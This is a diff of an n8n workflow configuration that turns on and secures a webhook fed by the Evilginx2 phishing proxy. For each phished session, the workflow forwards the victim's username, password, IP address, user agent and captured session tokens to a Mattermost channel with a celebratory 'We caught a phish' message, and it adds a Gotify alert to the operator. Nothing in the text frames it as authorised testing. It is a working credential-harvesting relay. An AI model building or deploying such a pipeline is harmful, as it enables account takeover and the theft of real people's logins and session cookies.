@@ -15,6 +15,7 @@
     },
     {
       "parameters": {
+        "authentication": "headerAuth",
         "httpMethod": "POST",
         "path": "a21d6bad-37d9-42d8-aad2-83941d77c24a",
         "options": {}
@@ -28,11 +29,14 @@
       ],
       "webhookId": "a21d6bad-37d9-42d8-aad2-83941d77c24a",
       "notesInFlow": true,
+      "credentials": {
+        "httpHeaderAuth": "Secret Header"
+      },
       "notes": "Evilginx2 authenticated users"
     },
     {
       "parameters": {
-        "channelId": "antmpdeqxfnajniuw813ooq6ow",
+        "channelId": "1533asrac3bupkt5ezx39spncc",
         "message": "=## We caught a phish :fishing_pole_and_fish: \n@channel reel in the rewards !\n\n| Data | Value |\n| ----------- | ------------------------------------------- |\n| id | {{$json[\"body\"][\"Session\"][\"id\"]}} |\n| phishlet | {{$json[\"body\"][\"Session\"][\"phishlet\"]}} |\n| landing_url | {{$json[\"body\"][\"Session\"][\"landing_url\"]}} |\n| remote_addr | {{$json[\"body\"][\"Session\"][\"remote_addr\"]}} |\n| user_agent | {{$json[\"body\"][\"Session\"][\"useragent\"]}} |\n| create_time | {{$json[\"body\"][\"Session\"][\"create_time\"]}} |\n| update_time | {{$json[\"body\"][\"Session\"][\"update_time\"]}} |\n| username | `{{$json[\"body\"][\"Session\"][\"username\"]}}` |\n| password | `{{$json[\"body\"][\"Session\"][\"password\"]}}` |\n| tokens | `{{$json[\"body\"][\"tokens\"]}}` |",
         "attachments": [],
         "otherOptions": {}
@@ -46,7 +50,7 @@
       ],
       "notesInFlow": true,
       "credentials": {
-        "mattermostApi": "Mattermost test"
+        "mattermostApi": "Sir Phishelot"
       },
       "notes": "Push msg phish channel"
     },
@@ -63,6 +67,22 @@
       ],
       "notesInFlow": true,
       "notes": "Converts epoch time to UTC"
+    },
+    {
+      "parameters": {
+        "message": "=We caught a phish at {{$json[\"body\"][\"Session\"][\"create_time\"]}}. \nCheck mattermost for the deeds!",
+        "additionalFields": {}
+      },
+      "name": "Gotify",
+      "type": "n8n-nodes-base.gotify",
+      "typeVersion": 1,
+      "position": [
+        800,
+        250
+      ],
+      "credentials": {
+        "gotifyApi": "Gotify n8n"
+      }
     }
   ],
   "connections": {
@@ -84,12 +104,17 @@
             "node": "Mattermost",
             "type": "main",
             "index": 0
+          },
+          {
+            "node": "Gotify",
+            "type": "main",
+            "index": 0
           }
         ]
       ]
     }
   },
-  "active": false,
+  "active": true,
   "settings": {},
   "id": "1"
 }
